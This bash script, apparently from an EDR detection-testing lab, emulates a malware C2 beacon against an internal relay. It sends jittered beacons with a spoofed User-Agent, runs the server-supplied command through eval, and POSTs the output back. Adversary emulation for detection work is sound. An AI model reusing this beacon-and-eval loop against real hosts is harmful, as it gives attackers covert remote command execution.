#!/bin/bash
#
# run-c2-beacon.sh
# ---------------------------------------------------------------------------
# EDR DETECTION COVERAGE — NON-PRODUCTION USE ONLY
#
# Emulates malware check-in behaviour against the environment's control-api relay
# (services/control_api.py): periodic, jittered beacons with a spoofed benign
# User-Agent, occasionally fetching and "executing" the relay's hardcoded
# no-op decoy task. All traffic stays on the environment's internal `northline-net` bridge.
#
#   periodic jittered beacon        C2 over web protocol      (T1071.001)
#   custom beacon interval/jitter   Application Layer Protocol: Web Protocols (T1071.001)
#   fetch + run decoy task          Execution via C2 channel   (T1059)
#
# Usage: BEACON_COUNT=10 bash playbooks/run-c2-beacon.sh
# ---------------------------------------------------------------------------
set -u
source "$(cd "$(dirname "$0")" && pwd)/lib-stealth.sh"

C2_HOST="${C2_HOST:-control-api}"
C2_PORT="${C2_PORT:-8443}"
RESULTS_DIR="${RESULTS_DIR:-/home/root/results}"
BEACON_COUNT="${BEACON_COUNT:-6}"
SESSION="$(date +%s)"
LOG="${RESULTS_DIR}/c2beacon_${SESSION}.log"
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"  # benign-looking spoof
[ -n "${ST_UA:-}" ] && UA="$ST_UA"

mkdir -p "$RESULTS_DIR"
say() { echo -e "[$(date -u +%H:%M:%S)] $*" | tee -a "$LOG"; }
step() { echo "" | tee -a "$LOG"; say "=== $* ==="; }

say "Northline :: C2 beacon emulation :: session=$SESSION"
say "target=${C2_HOST}:${C2_PORT} beacons=${BEACON_COUNT}"
say "$(st_banner)"

step "C2 beaconing with jittered interval (ATT&CK T1071.001)"
for i in $(seq 1 "$BEACON_COUNT"); do
    st_mark T1071.001 "beacon-$i"
    ST_UA="$UA" RESP="$(st_http GET "http://${C2_HOST}:${C2_PORT}/beacon?i=${i}&session=${SESSION}")"
    say "beacon #$i -> $RESP"

    if echo "$RESP" | grep -q 'echo decoy-task-executed'; then
        step "executing decoy task returned by C2 (ATT&CK T1059)"
        act T1059 "eval C2-supplied task (echo decoy-task-executed)" "$LAB_NODE" "task decoy-task-0001"
        OUT="$(eval "$(echo "$RESP" | python3 -c 'import sys,json; print(json.load(sys.stdin)["task"]["command"])' 2>/dev/null)" 2>&1)"
        say "task output: $OUT"
        st_http POST "http://${C2_HOST}:${C2_PORT}/task-result" "task_id=decoy-task-0001 output=${OUT}" >/dev/null
        say "posted task-result back to C2"
    fi

    if [ "$i" -lt "$BEACON_COUNT" ]; then
        say "sleeping (jitter ${ST_JITTER_MIN}-${ST_JITTER_MAX}s, scale ${TIME_SCALE}) before next beacon"
        J="$(st_sleep "$ST_JITTER_MIN" "$ST_JITTER_MAX")"; say "slept ${J}s"
    fi
done

step "Done — ${BEACON_COUNT} beacons sent."
say "artifacts: $LOG  (server-side log: results/control_api_beacons.log)"

act_summary
